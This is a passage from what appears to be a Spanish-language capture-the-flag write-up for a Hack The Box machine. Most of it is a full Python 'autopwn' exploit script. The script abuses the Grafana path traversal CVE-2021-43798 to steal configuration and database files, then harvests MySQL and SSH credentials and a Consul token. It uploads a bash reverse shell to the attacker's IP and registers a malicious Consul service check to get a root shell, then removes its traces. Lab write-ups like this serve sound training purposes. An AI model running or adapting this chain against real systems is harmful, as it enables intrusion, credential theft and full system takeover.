				prepare_request = session.prepare_request(request)
				prepare_request.url = vulnerable_path

				response = session.send(prepare_request)

				if 'Plugin not found' in response.text:
					exit('\n[!] File not found.')
				else:
					if response.status_code == 200:
						file_name = file.split('/')[-1] # extract only file name

						with open(file_name, 'wb') as file:
							file.write(response.content)

						log.info(f'(CVE-2021-43798) Extracted file -> {file_name}'); time.sleep(1)
		
		except Exception as error:
			exit('\n[x] Error: %s' % error)

	def get_database_path(self):
		try:
			file_name = self.target_files['grafana_conf'].split('/')[-1] # extract only file name

			with open(file_name, 'rb') as file:
				content = file.read()

				filter_data = findall(r';data = (.+)|;path = (.+)', content.decode('utf-8'))

				database_path = filter_data[0][0] + '/' + filter_data[1][1]

				self.target_files['grafana_db'] = database_path

		except Exception as error:
			exit('\n[x] Error: %s' % error)

	def get_mysql_cred(self):
		try:
			file_name = self.target_files['grafana_db'].split('/')[-1] # extract only file name

			with sqlite3.connect(file_name) as connection:
				cursor = connection.cursor()

				query = 'SELECT user, password FROM data_source'
				response = cursor.execute(query)

				username, password = response.fetchone()

				self.target_credentials['mysql']['user'] = username
				self.target_credentials['mysql']['pass'] = password

				log.success('Mysql credentials -> {}:{}'.format(username, password)); time.sleep(1)

		except Exception as error:
			exit('\n[x] Error: %s' % error)

	def extract_ssh_cred(self):
		try:
			connection = connector.connect(host=self.target_host['ip_address'],
										   database='whackywidget',
										   user=self.target_credentials['mysql']['user'],
										   password=self.target_credentials['mysql']['pass'])

			if connection.is_connected():
				cursor = connection.cursor()

				query = 'SELECT user, pass from users'
				cursor.execute(query)

				username, b64_password = cursor.fetchone()

				# decode base64 password
				b64_bytes = b64_password.encode('ascii')
				msg_bytes = b64decode(b64_bytes)
				password = msg_bytes.decode('ascii').replace('\n', '')

				self.target_credentials['ssh']['user'] = username
				self.target_credentials['ssh']['pass'] = password

				log.success('SSH credentials -> {}:{}'.format(username, password)); time.sleep(1)

		except Exception as error:
			exit('\n[x] Error: %s' % error)
		finally:
			if connection.is_connected():
				cursor.close()
				connection.close()

	def ssh_connection(self, user, password):
		try:
			ssh_client = SSHClient()
			ssh_client.set_missing_host_key_policy(AutoAddPolicy())
			ssh_client.connect(self.target_host['ip_address'],
							   port=22,
							   username=user,
							   password=password)

			return ssh_client

		except Exception as error:
			exit('\n[x] Error: %s' % error)

	def get_consul_token(self, ssh_client):
		try:
			command = "cd /opt/my-app/ && git show" # path repository
			_stdin, _stdout, _stderr = ssh_client.exec_command(command)

			output = _stdout.read().decode('utf-8')
			token = findall(r'--token (.*?) ', output)[0]

			self.target_credentials['consul']['token'] = token

			log.success('Consul token -> {}'.format(token)); time.sleep(1)

		except Exception as error:
			exit('\n[x] Error %s:' % error)

	def prepare_files(self):
		# reverse shell file
		shell_data = "#!/bin/bash\n\n/bin/bash -i >& /dev/tcp/{}/{} 0>&1".format(self.args.ip, self.args.port)

		with open(self.shell_file, 'w') as file:
			file.write(shell_data)

			log.info('File created : {}'.format(self.shell_file)); time.sleep(1)

		# consul service RCE file
		json_data = {
			"ID": "autopwn_shell",
			"Name": "pwn",
			"Address": "127.0.0.1",
			"Port": 80,
			"Check": {
				"DeregisterCriticalServiceAfter": "90m",
				"Args": ["/bin/bash", f"/tmp/.{self.args.ip}/shell.sh"],
				"Interval": "10s",
				"Timeout": "86400s"
			}
		}

		json_obj = dumps(json_data, indent=4)

		with open(self.json_file, 'w') as file:
			file.write(json_obj)

			log.info('File created : {}'.format(self.json_file)); time.sleep(1)

	def upload_files(self, ssh_client):
		with ssh_client.open_sftp() as sftp_client:
			sftp_client.put(self.shell_file, '/tmp/.{}/{}'.format(self.args.ip, self.shell_file))
			sftp_client.put(self.json_file, '/tmp/.{}/{}'.format(self.args.ip, self.json_file))

			log.info('Uploaded files'); time.sleep(1)

	def get_shell(self):
		try:
			ssh_client = self.ssh_connection(user=self.target_credentials['ssh']['user'],
											 password=self.target_credentials['ssh']['pass'])

			# create workstation
			ssh_client.exec_command('mkdir -p /tmp/.{}'.format(self.args.ip))

			# get token and upload required files
			self.get_consul_token(ssh_client)
			self.upload_files(ssh_client)
			
			# create service and send root shell
			command = "curl -X PUT 'http://localhost:8500/v1/agent/service/register?replace-existing-checks=true'" \
				+ f" -H 'X-Consul-Token: {self.target_credentials['consul']['token']}'" \
				+ f" --data @/tmp/.{self.args.ip}/{self.json_file}"

			ssh_client.exec_command(command)

			# listen mode to receive shell
			shell = listen(self.args.port, timeout=20).wait_for_connection()

			if shell.sock:
				log.info('Press Ctrl + D to exit.')
				shell.interactive()

			log.info('Removing service')
			# remove service
			command = "curl -X PUT 'http://localhost:8500/v1/agent/service/deregister/autopwn_shell'" \
				+ f" -H 'X-Consul-Token: {self.target_credentials['consul']['token']}'"
			ssh_client.exec_command(command)

			log.info('Removing workstation with uploaded files')
			# remove workstation
			ssh_client.exec_command(f'rm -r /tmp/.{self.args.ip}')

			# close ssh connection
			ssh_client.close()

		except Exception as error:
			exit('\n[x] Error: %s' % error)

## Main flow
if __name__ == '__main__':
	ascii_title = '''
	 /\  ._ _  |_   _.  _  _  _.  _|  _  ._    /\      _|_  _  ._       ._  
	/--\ | | | |_) (_| _> _> (_| (_| (_) |    /--\ |_|  |_ (_) |_) \/\/ | | 
	                                                           |           
	                                                                  by marss
	'''

	parser = argparse.ArgumentParser(
		description=ascii_title,
		formatter_class=argparse.RawDescriptionHelpFormatter,
		epilog='''\nExample:
		autopwn.py -i 10.10.10.10 -p 4444
		''')

	parser.add_argument('-i', '--ip', required=True, help='Specified IP to receive the shell')
	parser.add_argument('-p', '--port', required=True, help='Specified PORT to receive the shell')

	args = parser.parse_args()

	print(ascii_title)

	exploit = Exploit(args)
	exploit.run()
```

> Poc Autopwn

![PoC Autopwn](autopwn.png){: .shadow}

> Puedes encontrar el script en mi repositorio [https://github.com/E1P0TR0](https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Autopwn_Assambador)
{: .prompt-info}
